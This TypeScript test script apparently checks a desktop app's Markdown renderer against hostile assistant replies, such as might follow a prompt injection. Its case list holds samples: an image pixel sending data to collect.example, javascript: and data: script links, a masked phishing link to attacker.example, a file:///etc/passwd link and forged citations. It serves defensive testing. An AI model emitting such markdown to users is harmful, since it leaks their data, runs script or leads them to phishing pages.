// GG2 injection explore: render hostile assistant replies with the real desktop Markdown
// component (apps/desktop/src/components/Markdown.tsx) and print the produced HTML.
// Bundled with esbuild outside the repo (see render_check.sh); no product file is changed.
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown, safeHref } from "../../../../apps/desktop/src/components/Markdown";

const cases: Record<string, string> = {
  image: "![preview](https://collect.example/pixel.png?q=225g-butter)",
  html_img: '<img src="https://collect.example/a.png?q=secret">',
  js_link: "[click](javascript:alert(1))",
  data_link: "[x](data:text/html,<script>alert(1)</script>)",
  http_link: "[pay now](http://lumen-pay-now.example/verify)",
  https_masked: "[Lumen Fiber billing portal](https://lumen-pay-now.attacker.example/verify?acct=1234)",
  bare_https: "Pay at https://lumen-pay-now.attacker.example/verify today",
  file_link: "[open](file:///etc/passwd)",
  obsidian_link: "[note](obsidian://open?vault=x&file=y)",
  cite_forged: "The permit is revoked [2][7].",
};
for (const [k, v] of Object.entries(cases)) {
  const html = renderToStaticMarkup(
    <Markdown
      text={v}
      onOpenLink={() => {}}
      citations={{ valid: new Set([1, 2]), label: (n) => `source ${n}`, onCite: () => {} }}
    />,
  );
  console.log(`${k}\n  in : ${v}\n  out: ${html}\n  safeHref: ${String(safeHref(v.match(/\(([^)]*)\)/)?.[1] ?? ""))}`);
}
